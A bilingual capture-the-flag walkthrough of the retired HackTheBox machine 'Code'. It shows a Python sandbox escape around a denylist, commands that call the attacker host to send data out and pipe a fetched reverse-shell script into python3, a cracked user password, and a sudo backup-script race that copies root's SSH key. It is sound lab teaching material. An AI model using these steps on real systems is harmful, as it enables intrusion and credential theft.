# Code [Easy]

> **ES:** Máquina Linux fácil: un editor de Python online con lista negra burlable (pyjail) da shell, y un backup con `sudo` permite leer `/root`.
> **EN:** Easy Linux machine: an online Python editor with a bypassable denylist (pyjail) gives shell, and a `sudo` backup tool allows reading `/root`.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Code] |
| **URL** | https://app.hackthebox.com/machines/Code |
| **IP lab** | 10.10.11.62 |
| **Fecha de resolución** | 2025-03-26 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía escape del sandbox Python → hash MD5 crackeado (martin) → abuso de `backy.sh` con `sudo`.
> **EN:** Get `user.txt` and `root.txt` via Python sandbox escape → cracked MD5 hash (martin) → abusing `backy.sh` with `sudo`.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] python3 (pyjail escape, reverse shell)
- [ ] sqlite3
- [ ] hash crack (MD5 lookup / john / hashcat)
- [ ] ssh

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Solo SSH y un "Python Code Editor" (Gunicorn) en el puerto 5000.
> **EN:** Only SSH and a "Python Code Editor" (Gunicorn) on port 5000.

```bash
nmap -sC -sV -oN nmap_init 10.10.11.62
```

**Resultado / Result:** 22/tcp OpenSSH 8.2p1 Ubuntu, 5000/tcp Gunicorn 20.0.4 "Python Code Editor". Captura del editor en `img/` (`img/image_20250323-192340.png`); captura legacy en `images/`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** El editor ejecuta código con filtro de palabras (`import`, `system`, `popen`, `subprocess`, `exec`, `open`, `read`, `eval`…). `print(dir())` muestra un entorno mínimo (`code`, `keyword`, `old_stdout`, `redirected_output`), típico pyjail. El filtro es por subcadena y se evade troceando strings (`"syste"+"m"`); un bypass con `base64`+`exec` no funcionó.
> **EN:** The editor runs code with a word filter (`import`, `system`, `popen`, `subprocess`, `exec`, `open`, `read`, `eval`…). `print(dir())` shows a minimal environment (`code`, `keyword`, `old_stdout`, `redirected_output`), typical pyjail. The filter is substring-based and bypassed by splitting strings (`"syste"+"m"`); a `base64`+`exec` bypass did not work.

```bash
# Probar en el editor web:
# print(dir())
# print("".__class__.__base__.__subclasses__())
# for index,i in enumerate("".__class__.__base__.__subclasses__()):
#     if "o"+"s." in str(i): print(index, i)   # 132 <class 'os._wrap_close'>
```

**Resultado / Result:** La clase `os._wrap_close` (índice 132) expone `__globals__` con el módulo `os`. Captura del filtro en `img/image_20250324-192421.png`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Desde `os._wrap_close.__init__.__globals__` se obtiene `os.system` y se descarga/ejecuta una reverse shell como `app-production`. Atajo alternativo: el propio editor permite consultar el ORM (`db.session.query(User)`), revelando usuarios y hashes MD5 directamente.
> **EN:** From `os._wrap_close.__init__.__globals__` we get `os.system` and download/execute a reverse shell as `app-production`. Alternative shortcut: the editor itself allows querying the ORM (`db.session.query(User)`), revealing users and MD5 hashes directly.

```bash
# En el editor (fragmentado para evitar el filtro):
# func = "".__class__.__base__.__subclasses__()[132].__init__.__globals__["syste"+"m"]
# print(func("curl 10.10.16.31:9999/`whoami`"))   # -> app-production
# print(func("curl 10.10.16.31/reverse-shell.py | python3"))
nc -lvnp 9999
python3 -m http.server 80
# --- atajo vía ORM en el editor ---
# print([u.username for u in db.session.query(User).all()])  # ['development', 'martin']
# print([u.password for u in db.session.query(User).all()])
# ['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be']
```

**Resultado / Result:** Reverse shell como `app-production` (`app-production@code:/home/app-production/app$`). `user.txt` de ese usuario legible en su home (formato: e235... ofuscado).

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** La app usa `instance/database.db` (SQLite, tablas `code` y `user`) con hashes MD5; `development:development` y `martin:nafeelswordsmaster` (MD5 `3de6f30c4a09c27fc71932bfc68474be`, crackeado por lookup/diccionario). La clave se reutiliza en SSH.
> **EN:** The app uses `instance/database.db` (SQLite, tables `code` and `user`) with MD5 hashes; `development:development` and `martin:nafeelswordsmaster` (MD5 `3de6f30c4a09c27fc71932bfc68474be`, cracked by lookup/dictionary). The password is reused over SSH.

```bash
file /home/app-production/app/instance/database.db  # SQLite 3.x
sqlite3 database.db ".tables"            # code  user
sqlite3 database.db "SELECT * FROM user;"
# 1|development|759b74ce43947f5f4c91aeddc3e5bad3
# 2|martin|3de6f30c4a09c27fc71932bfc68474be  -> nafeelswordsmaster
ssh martin@10.10.11.62  # clave de laboratorio retirado
cat /home/martin/user.txt
```

**Resultado / Result:** SSH como `martin` → `user.txt` (flag no reproducida).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `martin` corre `/usr/bin/backy.sh` con `sudo` sin contraseña. El script solo permite rutas bajo `/var/` y `/home/`, elimina `../` con un único `gsub` de `jq` y **reescribe el JSON antes de usarlo**: hay condición de carrera (reescribir `1.json` en bucle mientras se ejecuta el backup) para archivar `/var/../../../../root/` hacia `/home/martin/Backup`. El tarball resultante incluye `/root/root.txt` y `/root/.ssh/id_rsa` (login como root).
> **EN:** `martin` runs `/usr/bin/backy.sh` with passwordless `sudo`. The script only allows paths under `/var/` and `/home/`, strips `../` with a single `jq` `gsub` and **rewrites the JSON before using it**: there is a race (rewrite `1.json` in a loop while the backup runs) to archive `/var/../../../../root/` into `/home/martin/Backup`. The resulting tarball includes `/root/root.txt` and `/root/.ssh/id_rsa` (login as root).

```bash
sudo -l  # (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
cat /usr/bin/backy.sh
# --- lógica clave del script ---
# allowed_paths=("/var/" "/home/")
# updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./";""))' "$json_file")
# /usr/bin/echo "$updated_json" > "$json_file"   # reescribe ANTES de validar/usar
# ... valida prefijo /var/ u /home/ ...
# /usr/bin/backy "$json_file"                    # backy 1.2 de vdbsh/backy
# --- 1.json malicioso ---
# {"destination": "/home/martin/Backup", "multiprocessing": true,
#  "verbose_log": true, "directories_to_archive": ["/var/../../../../root/"]}
# Sesión 1 (bucle de reescritura):
for i in $(seq 100000); do echo <base64-de-1.json> | base64 -d > 1.json; done
# Sesión 2:
mkdir -p /home/martin/Backup
sudo /usr/bin/backy.sh 1.json
# 📤 Archiving: [/var/../../../../root] -> /home/martin/Backup ...
# ... /root/root.txt ... /root/.ssh/id_rsa ...
ls /home/martin/Backup/
ssh -i id_rsa root@10.10.11.62
cat /root/root.txt  # formato: 892e... (ofuscado)
```

**Resultado / Result:** Backup de `/root` (incluidos `root.txt` y claves SSH) copiado a directorio propio; `id_rsa` permite SSH como root. Técnica: path traversal + TOCTOU/race contra `backy` (vdbsh/backy).

---

## 🧠 Lo aprendido / Learned

> **ES:** Las denylist en pyjails se evaden con introspección (`__class__`, `__globals__`); los hashes débiles (MD5) + reutilización dan salto lateral; validar paths con un solo `gsub` y reescribir el JSON antes de usarlo abre carreras.
> **EN:** Pyjail denylists fall to introspection (`__class__`, `__globals__`); weak hashes (MD5) + reuse give lateral move; single-pass path sanitization with rewrite-before-use opens races.

- [ ] Escape de pyjail vía `object.__subclasses__()` y `__globals__`
- [ ] SQLite + MD5 crack + password reuse
- [ ] Abuso de `sudo` script con traversal y condición de carrera

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: bypass base64 fallido, query ORM en el editor, `task.json` con `/home/../../root`) — wither/nota migrada
- **Referencia técnica:** Proyecto backy usado por el binario — https://github.com/vdbsh/backy — vdbsh
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
